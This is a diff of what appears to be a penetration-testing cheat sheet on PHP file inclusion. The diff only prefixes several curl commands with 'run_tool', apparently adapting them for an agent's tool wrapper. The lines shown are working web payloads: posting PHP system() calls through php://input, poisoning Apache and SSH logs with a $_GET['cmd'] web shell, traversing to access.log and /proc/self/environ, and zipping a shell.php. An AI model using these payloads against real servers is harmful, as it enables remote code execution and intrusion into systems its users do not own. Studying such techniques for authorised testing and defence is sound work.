@@ -75,7 +75,7 @@ echo "BASE64_OUTPUT" | base64 -d
 
 ### php://input — Code Execution (requires allow_url_include=On)
 ```bash
-curl -X POST "http://target/index.php?page=php://input" --data "<?php system('id'); ?>"
+run_tool curl -X POST "http://target/index.php?page=php://input" --data "<?php system('id'); ?>"
 ```
 
 ### data:// — Code Execution (requires allow_url_include=On)
@@ -101,7 +101,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php
 ### Log Poisoning
 ```bash
 # Inject PHP into access log via User-Agent
-curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
+run_tool curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
 # Include the log file
 ?page=../../../var/log/apache2/access.log&cmd=id
 # Alt: SSH log injection
@@ -111,7 +111,7 @@ ssh "<?php system(\$_GET['cmd']); ?>"@target
 
 ### /proc/self/environ
 ```
-curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ"
+run_tool curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ"
 ```
 
 ### Session File Inclusion
